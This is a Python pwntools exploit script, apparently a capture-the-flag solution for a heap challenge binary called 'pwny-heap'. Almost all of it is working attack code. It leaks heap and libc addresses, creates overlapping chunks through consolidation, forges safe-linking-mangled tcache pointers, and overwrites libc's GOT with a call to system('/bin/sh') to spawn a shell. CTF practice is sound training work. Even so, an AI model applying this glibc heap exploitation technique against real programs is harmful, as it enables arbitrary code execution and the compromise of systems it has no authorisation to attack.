from pwn import *
from time import sleep
import psutil


elf = context.binary = ELF("pwny-heap", checksec=True)
libc = elf.libc
context.log_level = "debug"
#context.log_level = "critical"  # quiet mode


gs = """
b main
continue
"""


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("1.1.1.1", 5555)
    else:
        return process(elf.path)

io = start()

chnkIndex = -1


class ProgramInteraction:
    @staticmethod
    def malloc(size:int, index:int) -> int:
        global chnkIndex
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b": ", str(index).encode())
        io.sendlineafter(b": ", str(size).encode())

        chnkIndex += 1 
        log.info(f"calling malloc with size {size} | chunk index: {index}")
        return chnkIndex


    @staticmethod
    def free(index:int):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b": ", str(index).encode())
        log.info(f"freeing chunk {index}")


    @staticmethod
    def show(index:int) -> int:
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b": ", str(index).encode())
        io.recvuntil(b"here is some data for you buddy: ")
        data = io.recvline().strip().split(b"1. ")
        return u64(data[0].ljust(8, b"\x00"))



    @staticmethod
    def write2chunk(index:int, data:bytes):
        io.sendlineafter(b"> ", b"4")
        io.sendlineafter(b": ", str(index).encode())
        io.sendlineafter(b": ", data)

io = start()


"""
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
"""
def mangle(arbitrary_address: int, chunk_address: int) -> bytes:
    return p64(arbitrary_address ^ (chunk_address >> 12))


if __name__ == "__main__":
    p = ProgramInteraction()

    # fill up tcache 
    for i in range(7):
        p.malloc(0x100, i)

    # allocate a chunk for consolidation and a victim chunk
    consolidation_chunk = p.malloc(0x100, 7)
    victim_chunk = p.malloc(0x100, 8)

    # padding chunk so our overlapping chunk doesn't get sucked into the top chunk
    p.malloc(0x20, 9)
    
    # cause chunk overlapping
    for i in range(7):
        p.free(i)

    heap_leak = p.show(0)
    heap_base = heap_leak << 12
    log.info(f"FD of first tcache: {heap_leak:#0x}\nHeap base @ {heap_base:#0x}")
    
    # free the victim chunk so it will be added to unsorted bin
    p.free(victim_chunk)


    unsorted_fd_leak = p.show(victim_chunk)
    libc.address = unsorted_fd_leak - (0x21ac80+96) # offset main_arena+96
    log.info(f"LIBC BASE ADDRESS @ {libc.address:#0x}")

    # free the previous chunk and make it consolidate with the victim chunk
    p.free(consolidation_chunk)

    # add the victim chunk to tcache list by taking one out from it and free victim again
    p.malloc(0x100, 10)
    p.free(victim_chunk)
    
    # overwrite tcache FD (allocating any size larger then 0x100 will change the FD ptr into a tcache chunk)
    p.malloc(0x200, 11)
    
    # forge fake chunk
    fake_chunk = heap_base+0xb10
    fake_bk = heap_base+0x900
    libc_got_plt = libc.address+0x21a000
    fake_fw_ptr = mangle(libc_got_plt, fake_chunk)
    fake_bk_ptr = mangle(libc_got_plt, fake_chunk)
    

    p.write2chunk(11, p8(0)*0x108 + p64(0x111) + fake_fw_ptr + fake_bk_ptr)
    p.malloc(0x100, 12)
    p.malloc(0x100, 13)
    p.write2chunk(13, b"/bin/sh\0"*(0x98//8) + p64(libc.sym.system))
    io.interactive()
